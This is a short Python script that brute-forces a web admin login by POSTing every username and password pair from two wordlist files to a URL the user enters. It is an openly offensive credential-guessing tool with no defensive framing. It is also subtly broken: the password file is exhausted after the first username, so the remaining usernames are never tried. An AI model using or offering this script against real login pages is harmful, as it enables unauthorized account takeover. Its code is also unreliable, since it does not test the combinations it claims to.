import requests

def brute_force_login(url, user_file, pass_file):
    with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
        for username in users:
            for password in passwords:
                username = username.strip()
                password = password.strip()
                print(f'Trying username: {username} and password: {password}')
                
                response = requests.post(url, data={'username': username, 'password': password})
                
                if "Login successful" in response.text:
                    print(f'Success! Username: {username}, Password: {password}')
                    return
                else:
                    print('Login failed.')

    print('All combinations tried.')

if __name__ == "__main__":
    admin_url = input("Enter the admin login URL: ")
    user_file_path = input("Enter the path to admin.txt: ")
    pass_file_path = input("Enter the path to password.txt: ")
    
    brute_force_login(admin_url, user_file_path, pass_file_path)
